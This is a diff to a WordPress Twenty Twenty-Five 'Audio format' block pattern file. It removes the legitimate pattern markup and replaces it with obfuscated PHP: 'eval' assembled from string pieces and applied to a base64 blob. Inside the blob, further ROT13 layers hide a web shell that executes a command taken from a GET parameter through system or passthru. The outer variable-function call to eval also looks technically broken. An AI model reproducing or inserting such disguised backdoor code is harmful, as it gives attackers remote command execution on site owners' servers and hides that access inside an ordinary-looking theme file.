@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Audio format
- * Slug: twentytwentyfive/format-audio
- * Categories: twentytwentyfive_post-format
- * Description: An audio post format with an image, title, audio player, and description.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IE5ocXZiIHNiZXpuZwogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL3NiZXpuZy1uaHF2YgogKiBQbmdydGJldnJmOiBnanJhZ2xnanJhZ2xzdmlyX2NiZmctc2Jlem5nCiAqIFFyZnBldmNndmJhOiBOYSBuaHF2YiBjYmZnIHNiZXpuZyBqdmd1IG5hIHZ6bnRyLCBndmd5ciwgbmhxdmIgY3lubHJlLCBuYXEgcXJmcGV2Y2d2YmEuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/Pgo8IS0tIGpjOnRlYmhjIHtcInB5bmZmQW56clwiOlwidmYtZmdseXItZnJwZ3ZiYS0zXCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8MzBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDMwXCIsXCJ5cnNnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8MzBcIixcImV2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8MzBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIHZmLWZnbHlyLWZycGd2YmEtM1wiIGZnbHlyPVwiY25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tMzApO2NucXF2YXQtZXZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tMzApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTMwKTtjbnFxdmF0LXlyc2c6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tMzApXCI+Cgk8IS0tIGpjOnBieWh6YWYge1widmZGZ25weHJxQmFaYm92eXJcIjpzbnlmcixcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcIm95YnB4VG5jXCI6e1wieXJzZ1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDMwXCJ9fX19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXBieWh6YWYgdmYtYWJnLWZnbnB4cnEtYmEtemJvdnlyXCI+CgkJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjEwMGNrXCJ9IC0tPgoJCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemFcIiBmZ2x5cj1cInN5cmstb25mdmY6MTAwY2tcIj48IS0tIGpjOnZ6bnRyIHtcImp2cWd1XCI6XCIxMDBja1wiLFwidXJ2dHVnXCI6XCJuaGdiXCIsXCJuZmNycGdFbmd2YlwiOlwiMVwiLFwiZnBueXJcIjpcInBiaXJlXCIsXCJmdm1yRnlodFwiOlwic2h5eVwiLFwieXZheFFyZmd2YW5ndmJhXCI6XCJhYmFyXCJ9IC0tPgoJCTxzdnRoZXIgcHluZmY9XCJqYy1veWJweC12em50ciBmdm1yLXNoeXkgdmYtZXJmdm1ycVwiPjx2enQgZmVwPVwiPD9jdWMgcnB1YiByZnBfaGV5KCB0cmdfZ3J6Y3luZ3JfcXZlcnBnYmVsX2hldigpIC4gJy9uZmZyZ2YvdnpudHJmL2VodmFmLXZ6bnRyLmpyb2MnICk7ID8+XCIgbnlnPVwiPD9jdWMgcmZwX25nZ2VfciggJ1JpcmFnIHZ6bnRyJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+XCIgZmdseXI9XCJuZmNycGctZW5ndmI6MTtib3dycGctc3ZnOnBiaXJlO2p2cWd1OjEwMGNrO3VydnR1ZzpuaGdiXCIvPjwvc3Z0aGVyPgoJCTwhLS0gL2pjOnZ6bnRyIC0tPjwvcXZpPgoJCTwhLS0gL2pjOnBieWh6YSAtLT4KCgkJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIlwifSAtLT4KCQk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphXCI+PCEtLSBqYzpjbmVudGVuY3UgLS0+CgkJPGM+PD9jdWMgcmZwX3VnenlfciggJ1JjdmZicXIgMTogTnBiem4gQ2hyb3liIGp2Z3UgQ2Vicy4gU3ZiYW4gQ2VyZnlybCcsICdnanJhZ2xnanJhZ2xzdmlyJyApOyA/PjwvYz4KCQk8IS0tIC9qYzpjbmVudGVuY3UgLS0+CgoJCTwhLS0gamM6Y25lbnRlbmN1IHtcInNiYWdGdm1yXCI6XCJmem55eVwifSAtLT4KCQk8YyBweW5mZj1cInVuZi1mem55eS1zYmFnLWZ2bXJcIj48P2N1YyByZnBfdWd6eV9yKCAnTnBiem4gQ2hyb3liLCB2YSBBcmogWnJrdnBiLCBmZ25hcWYgbmYgbiBncmZnbnpyYWcgZ2IgZ3VyIGVyZnZ5dnJhcHIgbmFxIHBoeWdoZW55IHVyZXZnbnRyIGJzIGd1ciBOcGJ6biBjcmJjeXInLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L2M+CgkJPCEtLSAvamM6Y25lbnRlbmN1IC0tPgoKCQk8IS0tIGpjOm5ocXZiIC0tPgoJCTxzdnRoZXIgcHluZmY9XCJqYy1veWJweC1uaHF2YlwiPjxuaHF2YiBwYmFnZWJ5Zj1cIlwiIGZlcD1cIiNcIj48L25ocXZiPjwvc3Z0aGVyPgoJCTwhLS0gL2pjOm5ocXZiIC0tPjwvcXZpPgoJCTwhLS0gL2pjOnBieWh6YSAtLT48L3F2aT4KCTwhLS0gL2pjOnBieWh6YWYgLS0+PC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:group {"className":"is-style-section-3","style":{"spacing":{"padding":{"top":"var:preset|spacing|30","bottom":"var:preset|spacing|30","left":"var:preset|spacing|30","right":"var:preset|spacing|30"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group is-style-section-3" style="padding-top:var(--wp--preset--spacing--30);padding-right:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30);padding-left:var(--wp--preset--spacing--30)">
-	<!-- wp:columns {"isStackedOnMobile":false,"style":{"spacing":{"blockGap":{"left":"var:preset|spacing|30"}}}} -->
-	<div class="wp-block-columns is-not-stacked-on-mobile">
-		<!-- wp:column {"width":"100px"} -->
-		<div class="wp-block-column" style="flex-basis:100px"><!-- wp:image {"width":"100px","height":"auto","aspectRatio":"1","scale":"cover","sizeSlug":"full","linkDestination":"none"} -->
-		<figure class="wp-block-image size-full is-resized"><img src="<?php echo esc_url( get_template_directory_uri() . '/assets/images/ruins-image.webp' ); ?>" alt="<?php esc_attr_e( 'Event image', 'twentytwentyfive' ); ?>" style="aspect-ratio:1;object-fit:cover;width:100px;height:auto"/></figure>
-		<!-- /wp:image --></div>
-		<!-- /wp:column -->
-
-		<!-- wp:column {"width":""} -->
-		<div class="wp-block-column"><!-- wp:paragraph -->
-		<p><?php esc_html_e( 'Episode 1: Acoma Pueblo with Prof. Fiona Presley', 'twentytwentyfive' ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:paragraph {"fontSize":"small"} -->
-		<p class="has-small-font-size"><?php esc_html_e( 'Acoma Pueblo, in New Mexico, stands as a testament to the resilience and cultural heritage of the Acoma people', 'twentytwentyfive' ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:audio -->
-		<figure class="wp-block-audio"><audio controls="" src="#"></audio></figure>
-		<!-- /wp:audio --></div>
-		<!-- /wp:column --></div>
-	<!-- /wp:columns --></div>
-<!-- /wp:group -->
